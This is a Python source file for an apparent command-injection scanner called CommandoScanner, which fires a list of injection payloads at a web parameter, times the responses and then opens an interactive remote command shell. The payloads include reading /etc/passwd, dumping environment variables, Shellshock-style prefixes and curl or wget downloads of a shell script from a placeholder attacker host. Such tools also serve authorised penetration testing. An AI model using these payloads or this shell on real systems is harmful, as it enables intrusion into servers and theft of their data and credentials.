# CommandoScanner: A Command Injection Vulnerability Tester
# Automates detection of command injection vulnerabilities in web applications.
# Written by Jason Bernier
# https://github.com/jasonbernier/CommandoScanner

import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
import json

# Common user-agents for request randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
]

def generate_payloads(dynamic=False):
    """
    Generates a list of static and optional dynamic payloads for command injection testing.
    """
    static_payloads = [
        '; sleep 5', '&& sleep 5', '| sleep 5', '`sleep 5`', '$(sleep 5)',
        '; ping -c 5 127.0.0.1', '&& ping -c 5 127.0.0.1', '| ping -c 5 127.0.0.1',
        '"; ping -c 5 127.0.0.1', '\'; ping -c 5 127.0.0.1', '() { :; }; ping -c 5 127.0.0.1',
        '; nslookup example.com', '&& nslookup example.com', '| nslookup example.com',
        '"; nslookup example.com', '\'; nslookup example.com', '() { :; }; nslookup example.com',
        '; echo "Hello, World!"', '&& echo "Hello, World!"', '| echo "Hello, World!"',
        '"; echo "Hello, World!"', '\'; echo "Hello, World!"', '() { :; }; echo "Hello, World!"',
        '; id', '&& id', '| id',
        '"; id', '\'; id', '() { :; }; id',
        '; whoami', '&& whoami', '| whoami',
        '"; whoami', '\'; whoami', '() { :; }; whoami',
        '; hostname', '&& hostname', '| hostname',
        '"; hostname', '\'; hostname', '() { :; }; hostname',
        '; pwd', '&& pwd', '| pwd',
        '"; pwd', '\'; pwd', '() { :; }; pwd',
        '; date', '&& date', '| date',
        '"; date', '\'; date', '() { :; }; date',
        '; uname -a', '&& uname -a', '| uname -a',
        '"; uname -a', '\'; uname -a', '() { :; }; uname -a',
        '; df', '&& df', '| df',
        '"; df', '\'; df', '() { :; }; df',
        '; netstat -an', '&& netstat -an', '| netstat -an',
        '"; netstat -an', '\'; netstat -an', '() { :; }; netstat -an',
        '; env', '&& env', '| env',
        '"; env', '\'; env', '() { :; }; env',
        '; set', '&& set', '| set',
        '"; set', '\'; set', '() { :; }; set',
        '; ps', '&& ps', '| ps',
        '"; ps', '\'; ps', '() { :; }; ps',
        '; cat /etc/passwd', '&& cat /etc/passwd', '| cat /etc/passwd',
        '"; cat /etc/passwd', '\'; cat /etc/passwd', '() { :; }; cat /etc/passwd',
        '; ls', '&& ls', '| ls',
        '"; ls', '\'; ls', '() { :; }; ls',
        '; cat /etc/hosts', '&& cat /etc/hosts', '| cat /etc/hosts',
        '"; cat /etc/hosts', '\'; cat /etc/hosts', '() { :; }; cat /etc/hosts',
        '; curl -O http://malicious.com/shell.sh', '&& curl -O http://malicious.com/shell.sh', '| curl -O http://malicious.com/shell.sh',
        '"; curl -O http://malicious.com/shell.sh', '\'; curl -O http://malicious.com/shell.sh', '() { :; }; curl -O http://malicious.com/shell.sh',
        '; wget http://malicious.com/shell.sh', '&& wget http://malicious.com/shell.sh', '| wget http://malicious.com/shell.sh',
        '"; wget http://malicious.com/shell.sh', '\'; wget http://malicious.com/shell.sh', '() { :; }; wget http://malicious.com/shell.sh',
    ]

    dynamic_payloads = [
        'sleep 5 && echo DynScanner', 'timeout 5 && echo DynScanner'
    ]

    payloads = static_payloads
    if dynamic:
        payloads.extend(dynamic_payloads)

    return payloads

def send_request(url, method, param, payload, headers, proxy):
    """
    Sends a request with the given payload and measures the response time.
    """
    time.sleep(1)  # Delay between requests to mitigate rate-limiting
    start_time = time.time()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers['User-Agent'] = random.choice(USER_AGENTS)

    try:
        data = {param: payload} if method.lower() == 'post' else None
        params = {param: payload} if method.lower() == 'get' else None
        response = requests.request(method, url, params=params, data=data, headers=headers, proxies=proxies, timeout=30)
        elapsed_time = time.time() - start_time
        return payload, elapsed_time, response.text
    except requests.exceptions.RequestException as e:
        return payload, 0, f"Request failed: {e}"

def is_vulnerable(elapsed_time, baseline_time):
    """
    Determines if the increased response time indicates successful command execution.
    """
    return elapsed_time > baseline_time + 3  # Considering a 3-second threshold as indicative of command execution

def interactive_shell(url, method, param, headers, proxy):
    """
    Provides an interactive shell for real-time command execution on the vulnerable server.
    """
    print("\nCommandoScanner Interactive Shell. Type 'exit' to quit.")
    while True:
        cmd = input("CommandoScanner> ")
        if cmd.lower() == 'exit':
            break

        _, _, response = send_request(url, method, param, cmd, headers, proxy)
        print(response)

def output_to_file(filename, data):
    """
    Writes the results to the specified output file.
    """
    with open(filename, 'a') as file:
        file.write(data + '\n')

def main():
    parser = argparse.ArgumentParser(
        description="""CommandoScanner: A tool for automating the detection of command injection vulnerabilities.""",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('--url', type=str, required=True, help='The target URL for testing.')
    parser.add_argument('--param', type=str, required=True, help='The parameter suspected of vulnerability.')
    parser.add_argument('--method', type=str, choices=['GET', 'POST'], default='GET', help='HTTP method for requests.')
    parser.add_argument('--proxy', type=str, help='Optional proxy in http://127.0.0.1:8080 format.')
    parser.add_argument('--headers', type=json.loads, help='Optional JSON string of custom headers.')
    parser.add_argument('--dynamic', action='store_true', help='Enable dynamic payload generation.')
    parser.add_argument('--output', type=str, help='File to write the results to.')
    
    args = parser.parse_args()

    headers = {'User-Agent': random.choice(USER_AGENTS)}
    if args.headers:
        headers.update(args.headers)

    payloads = generate_payloads(args.dynamic)

    # Measuring baseline response time without payload
    _, baseline_time, _ = send_request(args.url, args.method, args.param, "baseline_check", headers, args.proxy)

    vulnerability_found = False

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(send_request, args.url, args.method, args.param, payload, headers, args.proxy) for payload in payloads]

        for future in as_completed(futures):
            payload, elapsed_time, _ = future.result()
            if is_vulnerable(elapsed_time, baseline_time):
                result = f"Payload: {payload}, Detected: Delay indicating potential vulnerability"
                if args.output:
                    output_to_file(args.output, result)
                else:
                    print(result)
                vulnerability_found = True

        if vulnerability_found:
            print("\nVulnerability detected. Launching interactive shell...")
            interactive_shell(args.url, args.method, args.param, headers, args.proxy)
        else:
            print("\nNo vulnerabilities detected with the provided payloads.")

if __name__ == "__main__":
    main()
